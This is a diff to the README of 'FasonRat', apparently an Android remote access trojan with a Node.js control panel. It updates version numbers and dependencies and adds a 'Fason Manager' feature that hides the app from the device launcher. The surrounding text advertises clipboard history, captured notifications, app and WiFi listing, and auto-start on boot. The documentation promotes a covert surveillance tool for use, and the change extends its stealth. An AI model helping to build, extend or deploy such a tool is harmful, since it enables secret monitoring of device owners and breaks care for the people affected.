@@ -1,8 +1,8 @@
 # FasonRat
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Version-2.3.0-purple?style=flat-square" alt="Version 2.3.0">
-  <img src="https://img.shields.io/badge/Android-14+-green?style=flat-square&logo=android" alt="Android 14+">
+  <img src="https://img.shields.io/badge/Version-2.3.1-purple?style=flat-square" alt="Version 2.3.1">
+  <img src="https://img.shields.io/badge/Android-15+-green?style=flat-square&logo=android" alt="Android 15+">
   <img src="https://img.shields.io/badge/Node.js-18+-339933?style=flat-square&logo=node.js" alt="Node.js 18+">
   <img src="https://img.shields.io/badge/Java-17-orange?style=flat-square&logo=openjdk" alt="Java 17">
   <img src="https://img.shields.io/badge/License-MIT-blue?style=flat-square" alt="MIT License">
@@ -36,6 +36,7 @@
 - 📶 **WiFi Scanner** - Scan nearby WiFi networks
 - 📦 **Installed Apps** - List all installed applications
 - 🔐 **Permissions** - View all granted/denied permissions
+- 🔧 **Fason Manager** - Hide/show app from device launcher
 
 ### ⚡ Background Features
 - 🔄 **Auto Boot** - Starts automatically on device boot
@@ -84,7 +85,7 @@
 | Component | Requirement |
 |-----------|-------------|
 | **Server** | Node.js 18+, npm/yarn, Java 8+ (for APK builder) |
-| **Android** | SDK 24+ (Android 7.0), Target SDK 34 (Android 14), Java 17 |
+| **Android** | SDK 24+ (Android 7.0), Target SDK 35 (Android 15), Java 17 |
 
 ### Quick Start
 
@@ -182,7 +183,9 @@ module.exports = {
         clipboard: '0xCB',
         apps: '0xIN',
         permissions: '0xPM',
-        checkPerm: '0xGP'
+        checkPerm: '0xGP',
+        fasonManager: '0xFM',
+        deviceInfo: '0xIF'
     }
 };
 ```
@@ -199,14 +202,14 @@ public class Config {
 ```gradle
 android {
     namespace 'com.fason.app'
-    compileSdk 34
+    compileSdk 35
 
     defaultConfig {
         applicationId 'com.fason.app'
         minSdk 24
-        targetSdk 34
-        versionCode 7
-        versionName "2.3.0"
+        targetSdk 35
+        versionCode 8
+        versionName "2.3.1"
     }
 
     signingConfigs {
@@ -262,6 +265,7 @@ android {
 | **Clipboard** | Clipboard history |
 | **Notifications** | Captured notifications |
 | **Permissions** | Granted/denied permissions |
+| **Visibility** | Hide/show app from launcher |
 
 ### Activity Logs
 - View all system events and operations
@@ -351,7 +355,7 @@ FasonRat/
 │   ├── web/
 │   │   ├── views/                # EJS templates
 │   │   └── public/               # CSS, JS
-│   ├── database/                 # JSON database files
+│   ├── data/                     # JSON database files
 │   └── app/factory/              # APK build tools
 │
 └── assets/                       # Documentation images
@@ -392,12 +396,12 @@ FasonRat/
 |------------|---------|
 | Language | Java 17 |
 | Min SDK | 24 (Android 7.0) |
-| Target SDK | 34 (Android 14) |
-| Socket.IO | 2.0.1 |
+| Target SDK | 35 (Android 15) |
+| Socket.IO | 2.1.0 |
 | UI | Material Design 3 |
-| Camera | CameraX 1.3.3 |
-| Location | Play Services 21.2.0 |
-| WorkManager | 2.9.0 |
+| Camera | CameraX 1.4.1 |
+| Location | Play Services 21.3.0 |
+| WorkManager | 2.10.0 |
 
 ### Server
 | Technology | Version |
